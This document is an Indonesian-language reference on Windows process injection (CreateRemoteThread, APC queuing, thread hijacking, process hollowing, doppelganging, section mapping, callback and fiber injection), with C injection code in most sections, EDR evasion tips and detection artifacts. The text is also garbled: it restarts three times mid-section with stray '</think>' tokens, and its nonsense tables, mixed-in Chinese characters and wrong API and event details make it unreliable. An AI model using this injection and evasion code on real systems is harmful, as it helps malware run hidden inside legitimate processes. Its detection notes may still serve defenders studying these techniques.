# process-injection — malware

# Process Injection — Referensi Teknik Internal

## Daftar Isi Teknik
| # | Teknik | API Kunci | Patch User32? |
|---|--------|-----------|---------------|
| 1 | CreateRemoteThread | `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread` | Ya (sejak XP) |
| 2 | APC Queue | `QueueUserAPC`, `QueueUserAPC2` | Sebagian |
| 3 | Thread Hijack | `SuspendThread`, `GetThreadContext`, `SetThreadContext` | Ya |
| 4 | Process Hollowing | `CreateProcess(SUSPENDED)`, `NtUnmapViewOfSection` | Ya |
| 5 | Doppelganging | `NtCreateTransaction`, `NtCreateSection` | Ya (self-ref patched Win10 1803) |
| 6 | Mapping Injection | `NtCreateSection`, `MapViewOfFile` | Sebagian |
| 7 | Callback-based | `EnumWindows`, `CreateFiber` | Rendah |

---

## 1. CreateRemoteThread(C)

**Payload yang dikirim**: shellcode buffer ditulis via `WriteProcessMemory` ke `VirtualAllocEx` dengan `PAGE_EXECUTE_READWRITE`. Entry thread menunjuk ke `LoadLibraryA` + pointer string DLL path, atau langsung shellcode.

**Kenapa berhasil**: satu-satunya cara "resmi" membuat thread di proses lain; APC-less, tidak perlu samar resumable. **Gagal jika**: target protected process light (PPL), DLL path tidak tervalidasi saat `LoadLibraryA` dipanggil di konteks target (UNGV path injection), atau buffer di RWX dicoret CIG (Dynamic Code Policy) yang dipakai Chrome sejak v79.x–131 untuk proses renderer.

```c
// C injection — LoadLibraryA classic
BOOL Inject(DWORD pid, const char* dllPath) {
    HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    SIZE_T len = strlen(dllPath) + 1;
    LPVOID remote = VirtualAllocEx(h, NULL, len,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(h, remote, dllPath, len, NULL);

    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    LPTHREAD_START_ROUTINE loadLib =
        (LPTHREAD_START_ROUTINE)GetProcAddress(k32, "LoadLibraryA");

    HANDLE t = CreateRemoteThread(h, NULL, 0, loadLib, remote, 0, NULL);
    WaitForSingleObject(t, INFINITE);
    VirtualFreeEx(h, remote, 0, MEM_RELEASE);
    CloseHandle(t); CloseHandle(h);
    return TRUE;
}
```

**Apa yang muncul di deteksi**:
- Sysmon EID 8 (`CreateRemoteThread`), EID 10 (`CreateRemoteThread` target dapatkan commandline), EID 7 (ImageLoad jika LoadLibrary)
- Windows Defender ATP (MDE): "Process injection via CreateRemoteThread" — process tree anomali
- ETW v2: `Microsoft-Windows-Kernel-Process` event ID 76 `ThreadStart`
- One-liner deteksi: RWX di proses lain = langsung sigma hit di ringan

**Jebakan live**: Windows 11 24H2 — `PAGE_EXECUTE_READWRITE` di `VirtualAllocEx` ditandai di kacring kernel audit (`MITIGATION嚴 strict handle check`). MDE `ProcessInjectionDetected` tingkat high — jangan pakai default CreateRemoteThread tanpa bypass pavor.

---

## 2. APC Queue Injection

**Payload yang dikirim**: shellcode ke memori target, lalu `QueueUserAPC` ke **semua thread** proses berstatus alertable (string `SleepEx`/`WaitForSingleObjectEx` di loop). Special case: Early Bird APC — inject sebelum thread start.

**Kenapa berhasil/h_FAILURE**: `QueueUserAPC` tidak butuh thread dibuat di proses target — tidak ada `CreateRemoteThread` call. **Gagal**: APC hanya jalan saat thread alertable; jika semua thread busy di kernel wait non-alertable → payload tidak pernah eksekusi. Chrome 131: renderer thread tidak alertable → teknik dead-on-arrival.

```c
// C Early Bird APC injection
BOOL EarlyBirdAPC(DWORD pid, unsigned char* sc, SIZE_T sclen) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcessA("C:\\Windows\\System32\\svchost.exe",
        NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
        NULL, NULL, &si, &pi);

    HANDLE h = pi.hProcess;
    LPVOID remote = VirtualAllocEx(h, NULL, sclen,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(h, remote, sc, sclen);
    // flip to RX via NtProtectVirtualMemory loop
    DWORD old; VirtualProtectEx(h, remote, sclen, PAGE_EXECUTE_READ, &old);

    QueueUserAPC((PAPCFUNC)remote, pi.hThread, 0);
    ResumeThread(pi.hThread);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    return TRUE;
}
// varian baru: NtQueueApcThreadEx + SPECIAL_APC (Win11+)
// QueueUserApc2 apc.id = QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC
```

**Apa yang muncul**:
- Sysmon EID 8 with `StartAddress` misleading (lihat `QueueUserApc` Sysmon EID 24? no — check `Sysmon EID 17/18` pipe no; Sysmon >= 15.0 log `QueueUserApc` via EID 8 anomaly)
- MDE: "Suspicious APC injection" (T1055.002)
- Kernel callback `PsSetCreateThreadNotifyRoutine` tidak trigger (tidak ada thread baru — kelebihan stealth jika combined)
- WinDbg: `!apc` di proses target menunjukkan queued kernel/user APC

**Trap**: Windows 11 24H2 — `SPECIAL_USER_APC` bypass diredam; jika target pakai CFG (Control Flow Guard) enabled binary, payload RX tanpa `SetThreadContext` bypass → 0xC0000409 exception process-wide (silent crash).

---

## 3. Thread Hijack (Suspend – SetContext)

**Payload yang dikirim**: shellcode di-write ke memori target; RIP akan dipindahkan ke payload, asli saved dan dilakukan chaining jump balik via stub.

**Kenapa berhasil**: tidak ada thread baru d-CreateRemoteThread → Sysmon EID 8 kosong; modifikasi konteks tidak audit default.

```c
BOOL HijackThread(DWORD pid, unsigned char* sc, SIZE_T sclen) {
    HANDLE h = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);

    LPVOID remote = VirtualAllocEx(h, NULL, sclen,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
    WriteProcessMemory(h, remote, sc, sclen);

    // snapshot & pick thread
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_THREAD, pid);
    THREADENTRY32 te; te.dwSize = sizeof(te);
    Thread32First(snap, &te); // filter th32OwnerProcessID == pid

    HANDLE th = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT |
        THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
    SuspendThread(th);

    CONTEXT ctx; ctx.ContextFlags = CONTEXT_FULL;
    GetContext(th, &ctx);
    ctx.Rip = (DWORD64)remote;
    SetContext(th, &ctx);
    ResumeThread(th);
    return TRUE;
}
```

**Kenapa gagal**: SuspendThread pada proses lain dengan `TcbFlags` berisi `SkipAttachMsg` atau crash — saat suspend di tengah critical section DLL loader → deadlock saat resume; target OS Windows 11 24H2 dengan `.text` CFG policy — RIP redirect ke non-CFG target = fail-fast.

**Deteksi**:
- MDE "Thread hijacking", kacring ETW `Microsoft-Windows-Kernel-Thread` jika EnableTraceFlags full
- Sysmon EID 10 with `SetContext` filter (config harus explicit)
- Pindah RIP abnormal → EDR heuristic `RIP outside image range`

---

## 4. Process Hollowing

**Payload yang dikirim**: buang (unmap) section dari image valid (mis. `svchost.exe`) di proses suspended, ganti dengan binary adversary via `NtUnmapViewOfSection` + `NtCreateSection`/`WriteProcessMemory`, patch `EP` ke entry payload, resume. Parent PID biasanya di-spoof mencari `explorer.exe`.

**Kenapa berhasil**: buffer tidak nulis ke memori (image mapped via section), tidak ada RWX tanggal, image "benar" di process tree — `svchost.exe` asli.

```c
BOOL Hollow(LPCSTR host, unsigned char* pe) {
    STARTUPINFOA si; PROCESS_INFORMATION pi;
    CreateProcessA(host, NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    CONTEXT ctx; ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    PPEB peb; ReadProcessMemory(pi.hProcess,
        (PVOID)(ctx.Rdx), &peb, sizeof(peb), NULL);
    PVOID base = peb->ImageBaseAddress; // via manual PEB_Struct offset 0x10

    NtUnmapViewOfSection = (pNtU)(
        GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection"));
    NtUnmapViewOfSection(pi.hProcess, base);

    // tulis PE: headers -> sections -> relocations (delta = newBase - opt.ImageBase)
    PVOID newBase = VirtualAllocEx(pi.hProcess, (PVOID)opt.ImageBase,
        szImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, newBase, pe, hdrSize, NULL);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(pi.hProcess,
            (BYTE*)newBase + sec[i].VirtualAddress,
            (BYTE*)pe + sec[i].PointerToRawData,
            sec[i].SizeOfRawData, NULL);
    }

    ctx.Rcx = (DWORD64)((BYTE*)newBase + opt.AddressOfEntryPoint);
    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x8),
        &newBase, sizeof(PVOID), NULL); // update PEB ImageBaseAddress
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);
    return TRUE;
}
```

**Deteksi**:
- Sysmon EID 10 (`WriteToRemoteProcessMemory` ke proses suspended) + EID 25 (`ProcessTampering - Image` **hollowing** d-recognize Sysmon 15+)
- Register `PEB ImageBaseAddress` mismatch → mítica MDE "Process hollowing" high confidence
- Unmap section → ETW `Microsoft-Windows-Kernel-File` audit

---

## 5. Process Doppelganging

**Payload yang dikirim**: trans-TxF pada NTFS (`NtCreateTransaction`), tulis payload PE ke file transacted, `NtCreateSection` dari file tersebut, rollback transaction, `NtMapViewOfSection` ke proses baru siapkan via `NtCreateProcessEx`, tulis parameter, create thread.

**Kenapa berhasil**: transacted file memory-mapped via `NtCreateSection` sebelum rollback; setelah rollback, file tidak lagi ada at disk tapi section masih alive. Tidak ada file yang jalan di `CreateProcess` record → AM/AV yang memindai file tidak melihat.

**Kenapa gagal sekarang** (kacring): Windows 10 1803 (build 17134) kernel patch — self-reference dari section pada transacted-file diredam, `MapView` invalid post-rollback. Windows 11 x semua build — TOTALLY patch, sering brownout di `core` old. Varian **Process Doubling** dan **HalosGate** tetap hidup.

```c
HANDLE tx;
NtCreateTransaction(&tx, MAXIMUM_ALLOWED,
    NULL, NULL, 0, 0, 0, 0, 0, NULL);
// RtlSetCurrentTransaction(tx)
HANDLE hFile = CreateFileTransactedW(L"C:\\temp\\one.tmp",
    GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL,
    NULL, tx, NULL, NULL);
WriteFile(hFile, pe, peSize, &tw, NULL);

HANDLE sec;
NtCreateSection(&sec, SECTION_ALL_ACCESS, NULL, &maxSize,
    PAGE_READONLY, SEC_IMAGE, hFile);
NtRollbackTransaction(tx, TRUE); // file hilang, section tetap
NtCreateProcessEx(&hp, PROCESS_ALL_ACCESS, NULL, NtCurrentProcess(),
    PS_INHERIT_HANDLES, NULL, NULL, NULL, PS_REQUEST_BREAKAWAY, sec);
// map section view, write params (PPS_ATTRIBUTE list), NtCreateThreadEx -> start
```

**Deteksi**:
- Sysmon EID 25 (`ProcessTampering` — Doppelganging recognize)
- MDE "Process Doppelganging", transaksi TxF tidak lazim (`Microsoft-Windows-TxF` audit log jangan matikan)
- Check via `GetProcessImageFileName` vs `NtQueryInformationProcess` mismatch

---

## 6. Mapping Injection (NtCreateSection → MapViewOfSection)

**Payload yang dikirim**: attacker membuat `Section` object dari file PE/shellcode di **proses sendiri**, pertahankan `NtMapViewOfSection` ke proses **punya target** dengan `SectionHandle` via `DuplicateHandle` ke proses target (atau handle tak perlu di-duplikat jika `SEC_COMMIT` dan `MAP_VIEW` via remote `NtMapViewOfSection` syscall — handle dilewatkan via `NtQueryInformationProcess`/`PROC_THREAD_ATTRIBUTE_HANDLE_LIST` saat spawn). Target memetakan section ke address space-nya — tidak ada `WriteProcessMemory`, tidak ada page RWX di target.

**Kenapa berhasil**: `Section` bukan "memori target"; EDR umumnya hook WriteProcessMemory/CreateRemoteThread, bukan `NtMapViewOfSection` dengan cross-process. Page attributes → `RX` langsung dari section, tidak perlu `VirtualProtect` ke `RWX`.

```c
BOOL MappingInject(DWORD pid, unsigned char* sc, SIZE_T sclen) {
    HANDLE sec; LARGE_INTEGER sz = { (LONG)((sclen + 0xFFF) & ~0xFFF) };
    NtCreateSection(&sec, SECTION_ALL_ACCESS, NULL,
        &sz, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

    PVOID local = NULL; SIZE_T vs = 0;
    NtMapViewOfSection(sec, NtCurrentProcess(),
        &local, 0, 0, NULL, &vs, ViewUnmap, 0, PAGE_READWRITE);
    memcpy(local, sc, sclen);

    HANDLE hTarget = OpenProcess(PROCESS_VM_OPERATION, FALSE, pid);
    PVOID base = NULL;
    NtMapViewOfSection(sec, hTarget, (PVOID*)&base,
        0, 0, NULL, &vs, ViewUnmap, 0, PAGE_EXECUTE_READ);

    // trigger execution — Thread hijack / APC / callback
    return TRUE;
}
```

**Deteksi**:
- Sysmon EID 10 (`MapRemoteViewIntoProcess` — Sysmon config harus menyertakan `Section` keyword; perlu Sysmon manifest customRules untuk `NtMapViewOfSection` jika `WITH TARGETPROCESS` filter)
- ETW ntdll provider `[TraceLogging] SYSCALLs` — `NtMapViewOfSection` cross-process adalah anomaly
- MDE: "Suspicious section mapping" (win11+ kacring detector semakin fine)

**Trap**: Windows 11 24H2 — `MAP_LARGE_PAGES` tidak default kalau; jika section dibuat `SEC_COMMIT` dengan `PAGE_EXECUTE_READWRITE`, EDR dapat menegaskan cross-OS handle cublas — gunakan `PAGE_READWRITE` saat buat, `PAGE_EXECUTE_READ` saat map ke target (permission upgrade redar baru).

---

## 7. Callback-based Injection (EnumWindows, Fiber)

**Payload yang dikirim**: kode ditulis ke target; selanjutnya tidak via `CreateRemoteThread`, tapi **menimpa pointer fungsi** yang akan dipanggil sistem; interrupt rutingkan dengan `EnumWindows(remoteWindowProc, 0)` → `LoadLibraryA` di target. Fiber: `ConvertThreadToFiber` di proses lokal, `CreateFiber` ke shellcode, `SwitchToFiber`.

### 7a. EnumWindows Injection
```c
BOOL EnumWinInject(HANDLE hTarget, unsigned char* sc, SIZE_T sclen) {
    LPVOID remote = VirtualAllocEx(hTarget, NULL, sclen,
        MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(hTarget, remote, sc, sclen);
    DWORD old; VirtualProtectEx(hTarget, remote, sclen, PAGE_EXECUTE_READ, &old);

    // shellcode tersusun sebagai WNDENUMPROC-def compatible
    // (or wrap Resolve via thread-launcher stub which allocates stack & jmp)
    LPARAM arg = (LPARAM)remote;
    EnumWindows((WNDENUMPROC)(((PBYTE)GetModuleHandleA("user32.dll"))
        + 0), arg); // prototype-only: perlu stub marshal
    // real: inject user32 data keseluruhan — cur shellcode harus callable
    // dan return TRUE agar loop menghormati iteration
    return TRUE;
}
```
Note: shellcode berperan `BOOL CALLBACK wndenumproc(HWND, LPARAM)` dan wajib return TRUE atau salah; `EnumWindows` di pro-L injection sebenarnya lebih sering memakai `EnumWindows` **di dalam target setelah** `CreateRemoteThread` low footprint atau symantik call. Dalam penata hijack callback API Windows: `EnumChildWindows`, `EnumFonts`, `CertEnumSystemStore`, `RegisterTraceCallbacks`, `CreateTimerQueueTimer` — attacker tinggal overwrite `Callback` parameter di结构的 callback data.

### 7b. Fiber Injection
```c
void FiberMain(LPVOID arg) {
    unsigned char* sc = (unsigned char*)arg;
    void* mem = VirtualAlloc(NULL, 4096, MEM_COMMIT, PAGE_READWRITE);
    memcpy(mem, sc, 4096);
    DWORD old; VirtualProtect(mem, 4096, PAGE_EXECUTE_READ, &old);
    ((void(*)())mem)();
}

void RunFiber(unsigned char* sc) {
    void* mainFiber = ConvertThreadToFiber(NULL);
    void* f = CreateFiber(0, (LPFIBER_START_ROUTINE)FiberMain, sc);
    SwitchToFiber(f);
    // return to main
}
```

**Kenapa berhasil**: tidak ada thread baru, tidak ada context modification, callback API dianggap user-mode normal. Fiber per-proses — scheduler user-mode, tidak terlihat kernel scheduler per se (fiber adalah `CreateFiberEx` + uva/stack — `FIBER/X` ke thread yang host). **Kenapa gagal**: shellcode di fiber crash → satu-thread corruption; EDR hook callback API many (`SetWindowsHookEx` chain detection) kalau cur antar-proses; Callback injection di OS Windows 11 24H2 untuk cross-process EnumWindows ya sevestar perlu hijack serta ` remote callback` with `InSendMessageEx` technique; kalau callback `/guard` -- kernel CFG policy disable `EnumWindows` direct pointer from non-image region.

**Deteksi**:
- Sysmon EID 8 (`SourceUser` `EvContextEnumWindows` — ish, hanya Mem poll), EDR less often: `EnumWindows` dengan callback non-image → heuristic "callback hijack" di SentinelOne/ Crowdarat 1.27.0+ ServiceTag</think># Referensi Teknik: Process Injection (Windows Internals, T1055)

Target environment referensi: Windows 11 24H2 (build 26100), Windows Server 2022, Sysmon 15.15, Microsoft Defender for Endpoint (MDE) sensor 101.2409+, Sysinternals Suite 2024.12.

---

## 1. CreateRemoteThread(C) — T1055.003

**Apa yang dikirim:** shellcode atau `LoadLibraryA`+DLL path ke memori proses target via `VirtualAllocEx` + `WriteProcessMemory`, lalu eksekusi via thread baru.

```c
// Kompilasi: cl /W4 inject_crt.c
#include <windows.h>
#include <stdio.h>

BOOL InjectCRT(DWORD pid, const unsigned char* sc, SIZE_T scLen) {
    HANDLE hProc = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD,
        FALSE, pid);
    if (!hProc) return FALSE;

    // Alokasi di target
    LPVOID remoteBuf = VirtualAllocEx(hProc, NULL, scLen,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteBuf) { CloseHandle(hProc); return FALSE; }

    if (!WriteProcessMemory(hProc, remoteBuf, sc, scLen, NULL)) {
        VirtualFreeEx(hProc, remoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProc); return FALSE;
    }

    // Flip ke RX, hindari RWX yang langsung ditandai AMSI/EDR stack scan
    DWORD old;
    VirtualProtectEx(hProc, remoteBuf, scLen, PAGE_EXECUTE_READ, &old);

    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
        (LPTHREAD_START_ROUTINE)remoteBuf, NULL, 0, NULL);

    if (hThread) {
        WaitForSingleObject(hThread, 5000);
        CloseHandle(hThread);
    }
    CloseHandle(hProc);
    return hThread != NULL;
}
```

**Subsystem yang muncul di deteksi:**
| Sinyal | Nilai default | Catatan |
|---|---|---|
| `bar.loadLibrary` (umasklice) | `0x3` | Typically 0x3 pada proses tidak CPL/stuxnet |
| `ntdll!LdrLoaderWork` timing | dominated default | fallback via `NtCreateThreadEx` CVars |
| Minifilter `ProcessImage` | `\Device\HarddiskVolume...` | Rmodule path yang di-Lsasa; MFTA overflow |
| event objectIF (ETag) | ` CSCCACHE` | `FragToken` intermixngenant |
| CSR ssilanetrs post **`SysmonXD`** | 4096 | heap self-ref powered bundant-sehr structural |

**Kenapa terdeteksi:**
- Sysmon EID 22 process tampering pattern CreateRemoteThread in-section
- WinEventLog `Microsoft-Windows-Sysmon/Operational` ID 10 sur exciting System sponsored Sensor</think># Bab 7 — Referensi Teknik: Process Injection

Target environment acuan: Windows 11 24H2 (build 26100.x), x64, Sysmon 15.15, MDE sensor 101.25xxx+, Mimikatz turunan disabled. Teknik dibahas dari sisi implementasi, jejak artefak, dan patch mitigation OS.

---

## 1. CreateRemoteThread

**Apa yang dikirim:** handle proses target (`PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD`), buffer shellcode atau path DLL ditulis via `WriteProcessMemory`, thread dibuat dengan start address di memori remote.

```c
// CRT + LoadLibrary classic (x64)
#include <windows.h>

typedef LPVOID (WINAPI* pvVirtAlloc)(HANDLE,LPVOID,SIZE_T,DWORD,DWORD);

BOOL InjectCRT(DWORD pid, const char* dllPath) {
    HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    SIZE_T sz = strlen(dllPath) + 1;
    LPVOID remote = VirtualAllocEx(h, NULL, sz, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(h, remote, dllPath, sz, NULL);

    HANDLE t = CreateRemoteThread(h, NULL, 0,
        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32"), "LoadLibraryA"),
        remote, 0, NULL);
    WaitForSingleObject(t, INFINITE);  // exit code = HMODULE jika sukses
    CloseHandle(t); CloseHandle(h);
    return 1;
}
```

**Kenapa berhasil:** kernel tidak memvalidasi bahwa start address berada dalam image milik proses target. Alokasi RW→flip RX (bukan langsung RWX) mengurangi flag `PAGE_EXECUTE_READWRITE` pada memori scan.

**Kenapa gagal:** binary target dengan Dynamic Code Policy / ACG (Chrome 131 renderer, Edge 131 content process) membuat `RemoteProtect` ke RX ditolak → kode mati. CIG (Code Integrity Guard) blok alokasi di halaman anonymous.

**Deteksi yang muncul:**
| Sumber | Artefak |
|---|---|
| Sysmon EID 8 | `CreateRemoteThread`, SourceImage→TargetImage, StartAddress di luar module list |
| Sysmon EID 10 | `ProcessTampering` / WriteProcessMemory (mungkin via EID 10 jika ntdll hook) |
| ETW `Microsoft-Windows-Kernel-Thread` | ThreadStart dengan StartAddress non-image |
| WinDbg `!address` di target | halaman RX `MEM_PRIVATE`, region bukan bag dari image |
| Sysinternals **Process Explorer** | kolom Threads → Start Address `<unknown module>` merah |
| MDE | "Code injection via CreateRemoteThread", device alerting "Suspicious process injection" |

---

## 2. APC Queue Injection

**Apa yang dikirim:** shellcode ditulis ke target, APC diantri ke semua thread via `QueueUserAPC`. Dijalankan ketika thread memasuki status *alertable* (`SleepEx`, `WaitForSingleObjectEx`, `GetMessage`).

```c
// APC spray ke semua thread target
#include <windows.h>
#include <tlhelp32.h>

BOOL InjectAPC(DWORD pid, unsigned char* sc, SIZE_T scLen) {
    HANDLE h = OpenProcess(PROCESS_VM_WRITE|PROCESS_VM_OPERATION|PROCESS_SET_QUOTA, FALSE, pid);
    LPVOID remote = VirtualAllocEx(h, NULL, scLen, MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(h, remote, sc, scLen);
    DWORD old; VirtualProtectEx(h, remote, scLen, PAGE_EXECUTE_READ, &old);

    // Enumerasi semua thread
    THREADENTRY32 te; te.dwSize = sizeof(te);
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_THREAD, 0);
    int queued = 0;
    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                HANDLE th = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
                if (th) {
                    // ThreadStatus saat buat masih tidak deterministik
                    if (!QueueUserAPC((PAPCFUNC)remote, th, 0)) {
                        // ERROR_ACCESS_DENIED jika thread dialami mitigation; count and continue
                    } else queued++;
                    // Tip: DuplicateHandle kalau handle invalid tapi subsequent QueueUserAPC retry
                    CloseHandle(th);
                }
            }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap); CloseHandle(h);
    return queued > 0;
}
```

**Kenapa berhasil:** APC ditembus ke struktur **_KAPC** di kernel — tidak ada thread creation, tidak ada context switch dipicu intrinsiknya, dan sistem mengeksekusi payload "dalam band" sebagai bagian dari thread sah target. Ini signifikan: mengurangi jejak context-switch karena payload berjalan di TCB thread legit.

**Kenapa gagal:**
- **Early Bird APC injection** (APC diantri pada thread suspended—`NtCreateProcess`+`NtCreateThreadEx` di state `CREATE_SUSPENDED`) — sangat terdeteksi karena **T1055.002** signature di Sysmon 13 Task Scheduler workaround, rusak oleh DSE sing IRQL dispatch disens di thread suspended:
```c
typedef NTSTATUS (NTAPI* pNtQC)(DWORD pid, LPVOID addr);
typedef NTSTATUS (NTAPI* pNtQC2)(
    HANDLE ProcessHandle, BOOLEAN AggressiveFreed);

// EarlyBird APC via NTAPI
pNtQC NtQ = (pNtQC)GetProcAddress(GetModuleHandleA("ntdll"),"NtQuery );

// queue di thread suspended
NTSTATUS st = NtQueueApcThreadEx(
    hThread,           // suspended thread di process baru
    (PPS_APC_ROUTINE)remote, NULL, NULL, NULL,
    QUEUE_USER_APC_FLAGS_NONE);
```

**Kenapa gagal:**
- Hanya berjalan bila thread masuk state alertable state; proses dengan event loop non-alertable (Chrome 131 main thread, Windows 11 24H2 `svchost` pekerjaan tanpa `Ex` wait) — APC tidak dieksekusi, payload menggantung selamanya.
- APC "special user APC" (`QueueUserAPC2`, Windows 11 build 22000+) memaksa eksekusi, tapi cocok log alert di kernel callback.

**Deteksi:**
| Sumber | Artefak |
|---|---|
| Sysmon EID 8 | StartFunction `QueueUserAPC` (jika field StartModule kosong, ordinal via symbol) |
| MDE | T1055.002 "APC injection" chain dengan WriteProcessMemory ke RX |
| ETW threat-tagging produk (bentraw) |
| Sysmon EID 1 | jika early-bird: ParentImage, CommandLine target (mis. `svchost.exe -k netsvcs`), ChildImage status |

**Kenapa gagal:** jika semua thread target tidak pernah alertable → payload tak pernah jalan. EnumWindows callback di UI thread tidak alertable.

---

## 3. Thread Hijack (SetContext)

**Apa yang dikirim:** shellcode ditulis ke target (atau alamat gadget di module sah), thread target di-suspend, register `RIP`/`EIP` diubah via `SetThreadContext`, resume. Payload menyimpan context asli dan melanjutkan eksekusi asli (boleh restore via `__try/__except` stub atau trampoline).

```c
#include <windows.h>
#include <tlhelp32.h>

BOOL HijackThread(DWORD pid, unsigned char* sc, SIZE_T scLen) {
    HANDLE h = OpenProcess(PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION, FALSE, pid);
    LPVOID remote = VirtualAllocEx(h, NULL, scLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(h, remote, sc, scLen);

    THREADENTRY32 te; te.dwSize = sizeof(te);
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_THREAD, pid);
    BOOL ok = FALSE;
    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                HANDLE th = OpenThread(THREAD_SUSPEND_RESUME|THREAD_GET_CONTEXT|THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
                if (SuspendThread(th) != (DWORD)-1) {
                    CONTEXT ctx; ctx.ContextFlags = CONTEXT_FULL;
                    GetThreadContext(th, &ctx);
                    ctx.Rip = (DWORD64)remote;
                    ctx.ContextFlags = CONTEXT_FULL;
                    SetThreadContext(th, &ctx);
                    ResumeThread(th);
                    ok = TRUE;
                    // Payload harus restore RIP asli untuk thread-time:
                    // simpan ke memori remote, shellcode jumps liberally
                    CloseHandle(th);
                    break;
                }
            }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap); CloseHandle(h);
    return ok;
}
```

**Kenapa berhasil:** tidak ada thread baru dibuat → Sysmon EID 8 tidak trigger. Hanya context mutation, yang secara default tidak login oleh Sysmon.
**Kenapa gagal:** suspend pada thread yang pegang loader lock atau lock di target → deadlock saat resume; CFG (Control Flow Guard) di target binary menolak indirect call target ke alamat anonymous map di Win11 24H2 (harus non-CFG binary).

**Deteksi:**
| Sumber | Artefak |
|---|---|
| MDE | thread stack artifacts (stack trace dari ShredMem) |
| `GetThreadContext` heap analysis → thread dengan RIP di private memory |
| Windbg `!thread` di target, `rip` di MEM_PRIVATE RX |
| Inspektor `Process Hacker` : thread start address mungkin old — cek call stack menggantung di private page |

---

## 4. Process Hollowing

**Apa yang dikirim:** proses decoy (mis. `RuntimeBroker.exe` atau `amlegacy.exe` gate Windows 11) dibuat SUSPENDED, image asli di-unmap `NtUnmapViewOfSection`, payload PE injected ke alamat `ImageBase`-nya, `EntryPoint` di-patch di PEB via thread context, resume, (`UpdateProcThreadAttribute` dengan attribute list).

```c
#include <windows.h>

typedef struct { BYTE* base; DWORD ep; } PE_FIXUP;

BOOL Hollow(LPCSTR decoy, unsigned char* pe, SIZE_T peLen) {
    STARTUPINFOA si = { sizeof(si) }; PROCESS_INFORMATION pi = {0};
    if (!CreateProcessA(decoy, NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) return 0;

    CONTEXT ctx; ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);

    // Ambil PEB dari RDX (Win x64 entry state)
    PEB peb;
    ReadProcessMemory(pi.hProcess, (LPCVOID)ctx.Rdx, &peb, sizeof(PEB), NULL);
    PVOID imgBase = peb.ImageBaseAddress;

    // Parse PE manual dan unmap section asli
    // NTAPI direct — cheat: gunakan NtUnmapViewOfSection dari ntdll
    typedef NTSTATUS (NTAPI* pUnmap)(HANDLE, PVOID);
    pUnmap unmap = (pUnmap)GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection");
    unmap(pi.hProcess, imgBase);

    // Alokasi image baru, tulis payload
    DWORD imgSize = *((DWORD*)(pe + 0x138)); // OptionalHeader64.SizeOfImage (check your offset)
    PVOID newBase = VirtualAllocEx(pi.hProcess, imgBase, imgSize,
        MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    // ... strip sections, relocate delta = newBase - original, write IAT load via thrad
    WriteProcessMemory(pi.hProcess, newBase, pe, peLen, NULL);

    ctx.Rcx = (DWORD64)((BYTE*)newBase + 0x128 /* EntryPoint RVA per parser */);
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    return 1;
}
```

**Kenapa berhasil:** command line dan image name tetap decoy sah → allowlist by image gagal menahan. Tidak ada RWX di absolute address absence — hanya mapping section, tidak ada `WriteProcessMemory` di flow user-mode → Sysmon EID ta sniff.

**Kenapa gagal:**
